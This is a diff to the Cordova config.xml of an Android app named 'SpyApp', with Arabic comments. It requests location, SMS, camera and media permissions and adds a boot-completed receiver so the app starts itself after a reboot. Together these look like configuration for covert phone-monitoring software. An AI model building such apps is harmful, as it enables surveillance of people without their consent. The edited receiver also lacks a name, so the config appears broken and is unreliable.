@@ -4,11 +4,12 @@
     xmlns:cdv="http://cordova.apache.org/ns/1.0">
 
     <name>SpyApp</name>
-    <description>SpyApp - Cordova Android 14 Compatible</description>
+    <description>SpyApp - Android 14 Compatible</description>
     <author email="youremail@example.com">Your Name</author>
     <content src="index.html" />
     <access origin="*" />
 
+    <!-- السماح بجميع الاتصالات -->
     <allow-intent href="http://*/*" />
     <allow-intent href="https://*/*" />
     <allow-intent href="tel:*" />
@@ -16,9 +17,11 @@
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
 
+    <!-- تهيئة SDK -->
     <preference name="android-targetSdkVersion" value="34" />
     <preference name="android-minSdkVersion" value="24" />
 
+    <!-- الإضافات -->
     <plugin name="cordova-plugin-camera" />
     <plugin name="cordova-plugin-sms" />
     <plugin name="cordova-plugin-media-capture" />
@@ -37,7 +40,7 @@
             <manifest xmlns:android="http://schemas.android.com/apk/res/android"
                       xmlns:tools="http://schemas.android.com/tools">
 
-                <!-- الأذونات -->
+                <!-- الأذونات الأساسية -->
                 <uses-permission android:name="android.permission.INTERNET" />
                 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
                 <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
@@ -50,6 +53,7 @@
                 <uses-permission android:name="android.permission.SEND_SMS" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
                 <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+                <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
                 <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
                 <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
                 <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
@@ -57,39 +61,13 @@
             </manifest>
         </edit-config>
 
-        <!-- receivers مع android:exported=true -->
+        <!-- تشغيل التطبيق تلقائياً بعد إعادة تشغيل الجهاز -->
         <config-file parent="/manifest/application" target="AndroidManifest.xml">
-            <receiver android:name="com.tomikorin.cordova.plugin.autostart.BootCompletedReceiver"
-                      android:enabled="true"
-                      android:exported="true">
+            <receiver android:enabled="true"
+                      android:exported="true"
+                      android:directBootAware="true">
                 <intent-filter>
                     <action android:name="android.intent.action.BOOT_COMPLETED" />
-                    <category android:name="android.intent.category.DEFAULT" />
-                </intent-filter>
-            </receiver>
-
-            <receiver android:name="com.tomikorin.cordova.plugin.autostart.UserPresentReceiver"
-                      android:enabled="true"
-                      android:exported="true">
-                <intent-filter>
-                    <action android:name="android.intent.action.USER_PRESENT" />
-                </intent-filter>
-            </receiver>
-
-            <receiver android:name="com.tomikorin.cordova.plugin.autostart.RestartReceiver"
-                      android:enabled="true"
-                      android:exported="true">
-                <intent-filter>
-                    <action android:name="android.intent.action.REBOOT" />
-                </intent-filter>
-            </receiver>
-
-            <receiver android:name="com.tomikorin.cordova.plugin.autostart.PackageReplacedReceiver"
-                      android:enabled="true"
-                      android:exported="true">
-                <intent-filter>
-                    <action android:name="android.intent.action.PACKAGE_REPLACED" />
-                    <data android:scheme="package" />
                 </intent-filter>
             </receiver>
         </config-file>
